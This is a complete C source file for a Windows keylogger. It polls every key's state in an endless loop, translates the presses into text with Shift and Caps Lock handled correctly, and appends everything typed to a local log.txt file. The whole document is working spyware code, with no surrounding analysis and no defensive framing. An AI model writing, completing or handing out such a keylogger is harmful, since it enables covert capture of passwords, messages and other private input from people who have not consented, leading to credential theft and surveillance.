#include <windows.h>
#include <stdio.h>
#include <ctype.h>

#define LOGFILE "log.txt"

int shiftPressed = 0;
int altPressed = 0;
int ctrlPressed = 0;

void logKey(const char *input) {
    FILE *file = fopen(LOGFILE, "a");
    if (file) {
        fputs(input, file);
        fclose(file);
    }
}

// Returns 1 if key is handled as a special key (or a modifier) and no further logging is needed.
int handleSpecialKeys(int key) {
    switch (key) {
        case VK_SPACE:      logKey(" "); return 1;
        case VK_RETURN:     logKey("\n"); return 1;
        case VK_BACK:       logKey("[BACKSPACE]"); return 1;
        case VK_TAB:        logKey("[TAB]"); return 1;
        case VK_CAPITAL:    logKey("[CAPS_LOCK]"); return 1;
        case VK_UP:         logKey("[UP_ARROW]"); return 1;
        case VK_DOWN:       logKey("[DOWN_ARROW]"); return 1;
        case VK_LEFT:       logKey("[LEFT_ARROW]"); return 1;
        case VK_RIGHT:      logKey("[RIGHT_ARROW]"); return 1;
        case VK_CONTROL:    
            if (!ctrlPressed) { 
                logKey("[CTRL]"); 
                ctrlPressed = 1; 
            } 
            return 1;
        case VK_MENU:       
            if (!altPressed) { 
                logKey("[ALT]"); 
                altPressed = 1; 
            } 
            return 1;
        case VK_SHIFT:      
            // Mark shift as pressed but DON'T log it.
            shiftPressed = 1; 
            return 1;
        default: 
            return 0;
    }
}

// Map keys to their shifted equivalents.
char mapWithShift(int key) {
    switch (key) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case VK_OEM_MINUS: return '_';
        case VK_OEM_PLUS:  return '+';
        case VK_OEM_4:     return '{';
        case VK_OEM_6:     return '}';
        case VK_OEM_5:     return '|';
        case VK_OEM_1:     return ':';  // ; becomes :
        case VK_OEM_7:     return '\"'; // ' becomes "
        case VK_OEM_COMMA: return '<';
        case VK_OEM_PERIOD:return '>';
        case VK_OEM_2:     return '?';
        case VK_OEM_3:     return '~';
        default:           return (char)toupper(key);
    }
}

void handleKeyPress(int key) {
    char keyChar[3] = {0};

    // If this is a special key (or modifier) then don't log further.
    if (handleSpecialKeys(key))
        return;

    // Handle letters:
    if (key >= 'A' && key <= 'Z') {
        // Check Caps Lock state (the low-order bit of GetKeyState(VK_CAPITAL) indicates toggling)
        int capsLockActive = GetKeyState(VK_CAPITAL) & 0x0001;
        // If Shift and Caps Lock states differ, we want an uppercase letter.
        int upper = shiftPressed ^ capsLockActive; 
        keyChar[0] = upper ? (char)key : (char)(key + 32);
    }
    // Handle digits:
    else if (key >= '0' && key <= '9') {
        keyChar[0] = shiftPressed ? mapWithShift(key) : (char)key;
    }
    // Handle OEM keys (punctuation/symbols):
    else {
        switch (key) {
            case VK_OEM_MINUS: 
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_MINUS) : '-'; 
                break;
            case VK_OEM_PLUS:  
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_PLUS)  : '='; 
                break;
            case VK_OEM_4:     
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_4)     : '['; 
                break;
            case VK_OEM_6:     
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_6)     : ']'; 
                break;
            case VK_OEM_5:     
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_5)     : '\\'; 
                break;
            case VK_OEM_1:     
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_1)     : ';'; 
                break;
            case VK_OEM_7:     
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_7)     : '\''; 
                break;
            case VK_OEM_COMMA: 
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_COMMA) : ','; 
                break;
            case VK_OEM_PERIOD:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_PERIOD): '.'; 
                break;
            case VK_OEM_2:     
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_2)     : '/'; 
                break;
            default:
                if (isprint(key))
                    keyChar[0] = (char)key;
                break;
        }
    }

    if (keyChar[0] != 0)
        logKey(keyChar);
}

void handleKeyRelease(int key) {
    if (key == VK_SHIFT) shiftPressed = 0;
    if (key == VK_MENU) altPressed = 0;
    if (key == VK_CONTROL) ctrlPressed = 0;
}

int main() {
    int keyStates[256] = {0};

    while (1) {
        Sleep(10);
        for (int key = 8; key < 256; key++) { // Changed loop range to include VK_OEM_2 (191) and beyond
            SHORT keyState = GetAsyncKeyState(key);
            if (keyState & 0x8000) {
                if (!keyStates[key]) {
                    handleKeyPress(key);
                    keyStates[key] = 1;
                }
            } else {
                if (keyStates[key]) {
                    handleKeyRelease(key);
                    keyStates[key] = 0;
                }
            }
        }
    }
    return 0;
}
